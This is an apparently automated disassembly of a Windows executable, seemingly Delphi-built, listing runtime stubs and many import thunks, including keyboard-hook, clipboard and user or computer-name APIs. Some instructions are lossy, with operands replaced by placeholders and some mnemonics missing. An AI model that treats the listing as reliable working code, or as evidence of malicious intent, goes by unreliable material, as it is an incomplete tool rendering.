jmp [ rw-data ]
QueryPerformanceCounter
jmp [ QueryPerformanceCounter@IAT ]
sub_3a61394
jmp [ rw-data ]
sub_3a6139c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_3a613d8
jmp [ rw-data ]
sub_3a61448
mov ecx [ eax ]
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] eax
retn
sub_3a6145c
mov ecx [ eax ]
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ eax + 0xc ]
mov eax [ eax + 0x10 ]
mov [ edx + 0xc ] ecx
mov [ edx + 0x10 ] eax
retn
sub_3a614a8
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
mov ecx [ eax + 0x20 ]
mov [ edx + 0x20 ] ecx
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_3a616d6
retn
sub_3a62f84
call sub_3a672cc
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_3a672cc
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_3a62fd8
mov [ rw-data ] edx
call sub_3a651d4
sub_3a63058
retn
sub_3a6306c
call sub_3a612cc
call sub_3a6305c
retn
sub_3a630b8
retn
sub_3a63134
push ebx
call sub_3a672cc
mov ebx [ eax + 0x4 ]
call sub_3a672cc
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_3a633d8
push ebx
xor ebx ebx
imul edx [ ebx + rw-data ] 0x8088405
inc edx
mov [ ebx + rw-data ] edx
mul edx
mov eax edx
pop ebx
retn
sub_3a63400
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_3a63410
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_3a634bc
mov dx 0xd7b2
call sub_3a63464
retn
sub_3a634c8
mov dx 0xd7b3
call sub_3a63464
retn
sub_3a63550
push ebx
mov ebx eax
push ebx
call sub_3a61214
dec eax
sete al
pop ebx
retn
sub_3a6372b
retn
sub_3a637dc
mov edx [ eax + 0x1c ]
call sub_3a63794
retn
sub_3a637e8
mov edx [ eax + 0x20 ]
call sub_3a63794
retn
sub_3a637f4
jmp [ rw-data ]
sub_3a6388c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0xd7b2
push sub_3a637f4
push 0x65
call sub_3a637fc
pop ebx
pop ebp
retn 0x4
sub_3a63933
retn
sub_3a63be8
mov ecx 0x3
call sub_3a63b08
retn
sub_3a63e24
mov ecx 0xff
call sub_3a63e30
retn
j_sub_3a63e5c
jmp sub_3a63e5c
sub_3a63e59
retn
sub_3a641e9
jmp sub_3a64b54
sub_3a6423c
fninit
fwait
fldcw [ rw-data ]
retn
sub_3a642fb
jmp sub_3a64b54
sub_3a64302
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a6430c
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_3a64318
push ebx
mov ebx eax
mov eax ebx
call sub_3a64348
call sub_3a62ee0
mov edx eax
mov eax ebx
call sub_3a6438c
pop ebx
retn
sub_3a64334
push ebx
mov ebx eax
mov eax ebx
call sub_3a643e4
mov eax ebx
call sub_3a62efc
pop ebx
retn
sub_3a64348
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_3a64370
call sub_3a6478c
test dl dl
jle r-xdata
retn
call sub_3a64734
sub_3a64430
retn
sub_3a644b8
jmp sub_3a64b54
sub_3a644bf
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a645c8
mov eax 0x8000ffff
retn
sub_3a645d0
retn
sub_3a645d4
retn
sub_3a645d8
retn
sub_3a6470d
jmp sub_3a648a0
sub_3a64712
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_3a64c5c
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_3a64734
sub_3a64734
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_3a6476b
jmp sub_3a648a0
sub_3a6478c
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_3a6479c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_3a64864
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_3a64880
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_3a64bd9
call sub_3a672cc
mov ecx [ eax ]
mov edx [ ecx ]
mov [ eax ] edx
mov eax [ ecx + 0x8 ]
jmp sub_3a64380
sub_3a64cf5
retn
sub_3a64e38
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_3a64ec9
jmp sub_3a648a0
sub_3a64f31
jmp sub_3a648a0
sub_3a64f4c
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_3a64e38
mov [ rw-data ] 0x0
call sub_3a64ee4
retn
sub_3a65069
retn
sub_3a651cf
pop ebp
pop edi
pop esi
pop ebx
retn
sub_3a651d4
mov [ rw-data ] eax
call sub_3a650f8
sub_3a65284
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
push ebx
call ExitThread
mov eax ebx
call [ rw-data ]
sub_3a654c4
retn
sub_3a65500
retn
sub_3a6550e
retn
sub_3a65527
retn
sub_3a65538
retn
sub_3a65632
retn
sub_3a656c4
retn
j_sub_3a65744
jmp sub_3a65744
sub_3a6578d
retn
sub_3a65795
retn
sub_3a657d7
retn
sub_3a65a4b
retn
sub_3a65a54
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_3a63030
sub_3a65a6c
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call sub_3a6136c
sub_3a65b90
push edx
mov edx esp
mov ecx 0x1
call sub_3a65b6c
pop edx
retn
sub_3a65bd8
retn
sub_3a65bea
retn
sub_3a65de0
mov ecx 0x1
jmp sub_3a65d4c
sub_3a65dea
retn
sub_3a65e20
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_3a63030
call [ rw-data ]
retn
sub_3a65f24
mov ecx 0x1
jmp sub_3a65e38
sub_3a65f2e
retn
sub_3a65f30
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_3a63030
call [ rw-data ]
retn
sub_3a66158
retn
sub_3a6615c
push edx
call sub_3a62ee0
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_3a65de0
pop eax
sub_3a66170
push eax
call sub_3a65f24
pop eax
call sub_3a62efc
retn
sub_3a66180
xchg ecx eax
xchg edx ecx
call sub_3a653fc
retn
sub_3a661d0
mov al 0x11
jmp sub_3a63030
sub_3a661fb
retn
sub_3a66424
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_3a66064
pop ebp
retn 0x4
j_sub_3a65e38
jmp sub_3a65e38
sub_3a66439
retn
sub_3a6643c
call sub_3a665dc
retn
sub_3a66668
call sub_3a66640
retn
sub_3a669d9
jmp sub_3a64b54
sub_3a66b44
call sub_3a66b54
retn
sub_3a66b4c
call sub_3a66b74
retn
sub_3a66b54
push ebx
mov ebx eax
mov eax 0x8
call sub_3a62ee0
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_3a66c13
jmp sub_3a648a0
sub_3a66c34
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_3a66ca8
jmp sub_3a64b54
sub_3a66caf
pop ecx
pop ebp
retn
sub_3a66d28
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_3a66d34
add eax 0x4
push eax
call sub_3a6137c
retn
sub_3a66d40
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_3a63030
sub_3a66d50
call sub_3a64318
mov [ eax + 0x4 ] 0x1
retn
sub_3a66d88
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_3a61374
pop ebp
retn 0x4
sub_3a6707c
jmp sub_3a64b54
sub_3a67083
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a67137
jmp sub_3a64b54
sub_3a6713e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a67187
jmp sub_3a64b54
sub_3a6718e
pop esi
pop ebx
pop ecx
pop ebp
retn
GetACP
jmp [ GetACP@IAT ]
sub_3a67248
jmp sub_3a64b54
sub_3a6724f
pop ebp
retn
sub_3a67254
jmp [ rw-data ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_3a67274
push eax
push 0x40
call LocalAlloc
retn
sub_3a67280
mov eax 0x40
retn
sub_3a6730c
mov eax rw-data
call sub_3a66c34
retn
sub_3a6735c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_3a67378
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_3a67380
push ecx
mov edx eax
and dx 0xffff
mov [ esp ] dx
shr eax 0x10
mov [ esp + 0x2 ] ax
mov eax [ esp ]
pop edx
retn
sub_3a67398
test eax eax
je r-xdata
xor eax eax
retn
add [ eax ] edx
add [ eax + 0x8 ] edx
add [ eax + 0x4 ] ecx
add [ eax + 0xc ] ecx
mov al 0x1
retn
GetUserNameA
jmp [ GetUserNameA@IAT ]
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegFlushKey
jmp [ RegFlushKey@IAT ]
CreateDirectoryA
jmp [ CreateDirectoryA@IAT ]
CreateFileA
jmp [ CreateFileA@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
DeleteFileA
jmp [ DeleteFileA@IAT ]
FileTimeToDosDateTime
jmp [ FileTimeToDosDateTime@IAT ]
FileTimeToLocalFileTime
jmp [ FileTimeToLocalFileTime@IAT ]
FileTimeToSystemTime
jmp [ FileTimeToSystemTime@IAT ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ FindFirstFileA@IAT ]
FindNextFileA
jmp [ FindNextFileA@IAT ]
FindResourceA
jmp [ FindResourceA@IAT ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetComputerNameA
jmp [ GetComputerNameA@IAT ]
GetCurrentProcess
jmp [ GetCurrentProcess@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetExitCodeThread
jmp [ GetExitCodeThread@IAT ]
GetFileAttributesA
jmp [ GetFileAttributesA@IAT ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetLogicalDriveStringsA
jmp [ GetLogicalDriveStringsA@IAT ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetTempPathA
jmp [ GetTempPathA@IAT ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GetVolumeInformationA
jmp [ GetVolumeInformationA@IAT ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
LoadResource
jmp [ LoadResource@IAT ]
LockResource
jmp [ LockResource@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ ResetEvent@IAT ]
ResumeThread
jmp [ ResumeThread@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetThreadLocale
jmp [ SetThreadLocale@IAT ]
SetThreadPriority
jmp [ SetThreadPriority@IAT ]
SizeofResource
jmp [ SizeofResource@IAT ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForMultipleObjectsEx
jmp [ WaitForMultipleObjectsEx@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
lstrcmpA
jmp [ lstrcmpA@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ GetFileVersionInfoA@IAT ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ VerQueryValueA@IAT ]
CopyEnhMetaFileA
jmp [ CopyEnhMetaFileA@IAT ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
DeleteEnhMetaFile
jmp [ DeleteEnhMetaFile@IAT ]
ExcludeClipRect
jmp [ ExcludeClipRect@IAT ]
ExtTextOutA
jmp [ ExtTextOutA@IAT ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
jmp [ GetCurrentPositionEx@IAT ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetEnhMetaFileHeader
jmp [ GetEnhMetaFileHeader@IAT ]
GetPixel
jmp [ GetPixel@IAT ]
GetRgnBox
jmp [ GetRgnBox@IAT ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetTextExtentPointA
jmp [ GetTextExtentPointA@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LineTo
jmp [ LineTo@IAT ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ MoveToEx@IAT ]
PlayEnhMetaFile
jmp [ PlayEnhMetaFile@IAT ]
Polyline
jmp [ Polyline@IAT ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ Rectangle@IAT ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetEnhMetaFileBits
jmp [ SetEnhMetaFileBits@IAT ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ CharLowerA@IAT ]
CallNextHookEx
jmp [ CallNextHookEx@IAT ]
CharLowerBuffA
jmp [ CharLowerBuffA@IAT ]
CharNextA
jmp [ CharNextA@IAT ]
CharToOemA
jmp [ CharToOemA@IAT ]
CharUpperBuffA
jmp [ CharUpperBuffA@IAT ]
CheckMenuItem
jmp [ CheckMenuItem@IAT ]
ChildWindowFromPoint
jmp [ ChildWindowFromPoint@IAT ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CopyIcon
jmp [ CopyIcon@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefMDIChildProcA
jmp [ DefMDIChildProcA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ DestroyMenu@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
DispatchMessageW
jmp [ DispatchMessageW@IAT ]
DrawFrameControl
jmp [ DrawFrameControl@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
EnableScrollBar
jmp [ EnableScrollBar@IAT ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
EnumChildWindows
jmp [ EnumChildWindows@IAT ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ EqualRect@IAT ]
FindWindowA
jmp [ FindWindowA@IAT ]
FindWindowExA
jmp [ FindWindowExA@IAT ]
GetAsyncKeyState
jmp [ GetAsyncKeyState@IAT ]
GetClassLongA
jmp [ GetClassLongA@IAT ]
GetClassNameA
jmp [ GetClassNameA@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetClipboardData
jmp [ GetClipboardData@IAT ]
GetCursor
jmp [ GetCursor@IAT ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetDlgItem
jmp [ GetDlgItem@IAT ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ GetKeyNameTextA@IAT ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardLayoutNameA
jmp [ GetKeyboardLayoutNameA@IAT ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetLastActivePopup
jmp [ GetLastActivePopup@IAT ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuStringA
jmp [ GetMenuStringA@IAT ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetPropA
jmp [ GetPropA@IAT ]
GetScrollInfo
jmp [ GetScrollInfo@IAT ]
GetScrollRange
jmp [ GetScrollRange@IAT ]
GetSubMenu
jmp [ GetSubMenu@IAT ]
GetSysColor
jmp [ GetSysColor@IAT ]
GetSysColorBrush
jmp [ GetSysColorBrush@IAT ]
GetSystemMenu
jmp [ GetSystemMenu@IAT ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
InsertMenuItemA
jmp [ InsertMenuItemA@IAT ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsDialogMessageW
jmp [ IsDialogMessageW@IAT ]
IsIconic
jmp [ IsIconic@IAT ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ IsWindow@IAT ]
IsWindowUnicode
jmp [ IsWindowUnicode@IAT ]
IsZoomed
jmp [ IsZoomed@IAT ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
MsgWaitForMultipleObjects
jmp [ MsgWaitForMultipleObjects@IAT ]
MsgWaitForMultipleObjectsEx
jmp [ MsgWaitForMultipleObjectsEx@IAT ]
OemToCharA
jmp [ OemToCharA@IAT ]
PeekMessageW
jmp [ PeekMessageW@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ ScrollWindow@IAT ]
SendMessageA
jmp [ SendMessageA@IAT ]
SendMessageW
jmp [ SendMessageW@IAT ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ SetCapture@IAT ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetKeyboardState
jmp [ SetKeyboardState@IAT ]
SetMenuItemInfoA
jmp [ SetMenuItemInfoA@IAT ]
SetParent
jmp [ SetParent@IAT ]
SetScrollInfo
jmp [ SetScrollInfo@IAT ]
SetScrollPos
jmp [ SetScrollPos@IAT ]
SetScrollRange
jmp [ SetScrollRange@IAT ]
SetTimer
jmp [ SetTimer@IAT ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
ToAscii
jmp [ ToAscii@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
keybd_event
jmp [ keybd_event@IAT ]
sub_3a67f40
xchg edx eax
call sub_3a63154
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_3a680db
jmp sub_3a64b54
sub_3a680e2
pop ebp
retn
CoInitialize
jmp [ CoInitialize@IAT ]
CoUninitialize
jmp [ CoUninitialize@IAT ]
CoCreateInstance
jmp [ CoCreateInstance@IAT ]
CoTaskMemAlloc
jmp [ CoTaskMemAlloc@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
GetErrorInfo
jmp [ GetErrorInfo@IAT ]
sub_3a68150
test eax 0x80000000
sete al
retn
sub_3a68fb9
add eax 0xffffffd4
jmp sub_3a6ef54
sub_3a68fc9
add eax 0xffffffd4
jmp sub_3a6ee94
sub_3a68fdb
add [ esp + 0x4 ] 0xffffffd4
jmp sub_3a66d88
sub_3a68fe5
add [ esp + 0x4 ] 0xffffffd4
jmp sub_3a66d9c
sub_3a690bc
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
pop ebx
retn
CLSIDFromString
jmp [ CLSIDFromString@IAT ]
sub_3a69174
jmp sub_3a64b54
sub_3a6917b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a69743
jmp sub_3a64b54
sub_3a6974a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a69f0c
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp eax 0xffffffff
je r-xdata
pop ebx
retn
push eax
call FindClose
mov [ ebx + 0x1c ] 0xffffffff
sub_3a6a114
mov edx eax
xor eax eax
call sub_3a630bc
retn
sub_3a6a150
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_3a6a164
push esi
mov esi eax
xchg edx eax
call sub_3a63154
mov eax esi
pop esi
retn
sub_3a6a360
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_3a65498
pop esi
pop ebx
retn
sub_3a6a374
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_3a62ee0
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_3a6a388
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_3a6a3c0
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_3a62efc
sub_3a6a428
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_3a63030
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_3a6a44c
push ebx
mov ebx eax
mov eax ebx
call sub_3a652a0
pop ebx
retn
sub_3a6a7af
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_3a652a0
pop eax
pop ebx
retn
sub_3a6aa83
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_3a6abde
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_3a6af3b
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_3a6af3b
sub_3a6aff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3a65730
mov edx esi
xor ecx ecx
call sub_3a6ae84
pop esi
pop ebx
retn
sub_3a6b06c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3a65730
mov edx esi
mov cl 0x1
call sub_3a6ae84
pop esi
pop ebx
retn
sub_3a6b83a
jmp sub_3a64b54
sub_3a6b841
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a6b942
jmp sub_3a64b54
sub_3a6b949
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a6c0f0
jmp sub_3a64b54
sub_3a6c0f7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a6c2fe
jmp sub_3a64b54
sub_3a6c305
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a6c7b2
jmp sub_3a64b54
sub_3a6c7b9
movzx eax [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a6ccf3
jmp sub_3a64b54
sub_3a6ccfa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a6cda5
jmp sub_3a64b54
sub_3a6cdac
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_3a6ce4f
jmp sub_3a64b54
sub_3a6ce56
pop esi
pop ecx
pop ebp
retn
sub_3a6d038
jmp sub_3a64b54
sub_3a6d03f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a6d098
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_3a6d2f4
mov eax [ ebp + 0x4 ]
retn
sub_3a6d2f8
call sub_3a6d2f4
push eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
jmp sub_3a64c34
sub_3a6d315
retn
sub_3a6d3ae
jmp sub_3a64b54
sub_3a6d47c
jmp sub_3a64b54
sub_3a6d4ec
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_3a64334
sub_3a6d5e6
pop ebx
retn
sub_3a6d684
jmp sub_3a64b54
sub_3a6d68b
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a6d694
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_3a64c34
sub_3a6d6a1
retn
sub_3a6d6a4
push ebp
mov ebp esp
call sub_3a6d5e8
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_3a6d694
pop ebp
retn 0x4
sub_3a6d6c0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
retn
sub_3a6d758
push ebx
mov ebx eax
mov eax ebx
call sub_3a6d6d8
movzx eax al
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_3a6d92b
jmp sub_3a64b54
sub_3a6d932
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a6d9f5
jmp sub_3a64b54
sub_3a6d9fc
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_3a6da04
call sub_3a6d22c
mov eax 0x1
call sub_3a651d4
sub_3a6dbb4
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
